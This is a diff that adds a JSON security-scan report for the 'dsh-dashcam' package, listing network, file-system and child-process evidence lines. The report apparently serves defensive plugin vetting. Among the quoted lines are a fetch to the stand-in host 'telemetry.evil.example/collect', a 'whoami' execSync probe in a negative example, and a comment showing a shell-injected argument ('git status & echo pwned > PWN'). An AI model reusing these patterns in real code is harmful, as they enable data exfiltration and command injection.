@@ -1,0 +1,110 @@
+{
+  "name": "dsh-dashcam",
+  "version": "2.2.0",
+  "scannedAt": "2026-11-13T21:10:48.468Z",
+  "icon": null,
+  "network": {
+    "hit": true,
+    "evidence": [
+      {
+        "file": "dsh-dashcam-host/lib/client.js",
+        "line": 1574,
+        "text": "return fetch(url, { credentials: 'same-origin' }).then((res) => {"
+      },
+      {
+        "file": "examples/compliant-plugin/index.js",
+        "line": 5,
+        "text": "const https = require('node:https');"
+      },
+      {
+        "file": "examples/compliant-plugin/index.js",
+        "line": 19,
+        "text": "https.get('https://api.example.com:443/v1/status', (response) => {"
+      },
+      {
+        "file": "examples/negative-plugin/index.js",
+        "line": 14,
+        "text": "fetch('https://telemetry.evil.example/collect');"
+      },
+      {
+        "file": "src/runtime/bridge.js",
+        "line": 4,
+        "text": "const http = require('node:http');"
+      }
+    ]
+  },
+  "fileSystem": {
+    "hit": true,
+    "evidence": [
+      {
+        "file": "bin/dsh-dashcam.js",
+        "line": 5,
+        "text": "const fs = require('node:fs');"
+      },
+      {
+        "file": "bin/dsh-dashcam.js",
+        "line": 28,
+        "text": "return JSON.parse(fs.readFileSync(file, 'utf8'));"
+      },
+      {
+        "file": "bin/dsh-dashcam.js",
+        "line": 134,
+        "text": "fs.mkdirSync(outDir, { recursive: true });"
+      },
+      {
+        "file": "bin/dsh-dashcam.js",
+        "line": 140,
+        "text": "fs.writeFileSync(path.join(outDir, `${name}.private.pem`), privateKey);"
+      },
+      {
+        "file": "bin/dsh-dashcam.js",
+        "line": 141,
+        "text": "fs.writeFileSync(path.join(outDir, `${name}.public.pem`), publicKey);"
+      }
+    ]
+  },
+  "agentTools": {
+    "hit": false,
+    "evidence": []
+  },
+  "childProcess": {
+    "hit": true,
+    "evidence": [
+      {
+        "file": "examples/negative-plugin/index.js",
+        "line": 4,
+        "text": "const childProcess = require('node:child_process');"
+      },
+      {
+        "file": "examples/negative-plugin/index.js",
+        "line": 10,
+        "text": "childProcess.execSync('whoami');"
+      },
+      {
+        "file": "src/host/child-host.js",
+        "line": 3,
+        "text": "const { fork } = require('node:child_process');"
+      },
+      {
+        "file": "src/runtime/bridge.js",
+        "line": 11,
+        "text": "const childProcess = require('node:child_process');"
+      },
+      {
+        "file": "src/runtime/bridge.js",
+        "line": 83,
+        "text": "* execFile('git', ['status & echo pwned > PWN'], { shell: true })），"
+      }
+    ]
+  },
+  "installScripts": {
+    "hit": false,
+    "evidence": []
+  },
+  "dependencies": 0,
+  "minifiedFiles": [],
+  "binaryFiles": [],
+  "requiredServices": [],
+  "setupHints": [],
+  "skippedEntries": []
+}
